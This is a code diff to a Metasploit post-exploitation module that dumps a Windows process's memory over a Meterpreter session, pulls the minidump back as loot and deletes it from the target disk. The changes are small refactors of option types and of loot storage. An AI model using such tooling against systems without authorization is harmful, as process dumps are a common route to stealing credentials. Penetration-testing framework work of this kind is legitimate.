@@ -28,14 +28,14 @@ class MetasploitModule < Msf::Post
       )
     )
     register_options([
-      OptString.new('PID', [true, 'ID of the process to dump memory from', nil, /\d+/]),
+      OptInt.new('PID', [true, 'ID of the process to dump memory from']),
       OptString.new('DUMP_PATH', [true, 'File to write memory dump to', nil]),
-      OptEnum.new('DUMP_TYPE', [ true, 'Minidump size', nil, ['standard', 'full']])
+      OptEnum.new('DUMP_TYPE', [ true, 'Minidump size', 'standard', ['standard', 'full']])
     ])
   end
 
   def get_process_handle
-    target_pid = datastore['PID'].to_i
+    target_pid = datastore['PID']
     result = session.railgun.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, target_pid)
     error = result['GetLastError']
     unless error == 0
@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Post
   end
 
   def dump_process
-    target_pid = datastore['PID'].to_i
+    target_pid = datastore['PID']
     name = nil
     client.sys.process.processes.each do |p|
       if p['pid'] == target_pid
@@ -107,16 +107,11 @@ class MetasploitModule < Msf::Post
     path = datastore['DUMP_PATH']
 
     begin
-      meterp_temp = Tempfile.new('meterp')
-      meterp_temp.binmode
-      temp_path = meterp_temp.path
+      loot_path = store_loot('windows.process.dump', 'application/octet-stream', session, '')
       src_stat = client.fs.filestat.new(path)
       print_status("Downloading minidump (#{Filesize.new(src_stat.size).pretty})")
-      session.fs.file.download_file(temp_path, path)
-      dump_contents = File.read(temp_path, mode: 'rb')
-      loot_path = store_loot('windows.process.dump', 'application/octet-stream', session, dump_contents)
+      session.fs.file.download_file(loot_path, path)
       print_good("Memory dump stored at #{loot_path}")
-      ::File.delete(temp_path)
     ensure
       print_status('Deleting minidump from disk')
       session.fs.file.delete(path)
@@ -131,7 +126,7 @@ class MetasploitModule < Msf::Post
 
     print_status("Running module against #{sysinfo['Computer']}")
 
-    pid = datastore['PID'].to_i
+    pid = datastore['PID']
 
     if pid == (session.sys.process.getpid) && !datastore['ForceExploit']
       fail_with(Msf::Module::Failure::BadConfig, 'Dumping current process is not recommended (can result in deadlock). To run anyway, set ForceExploit to True')
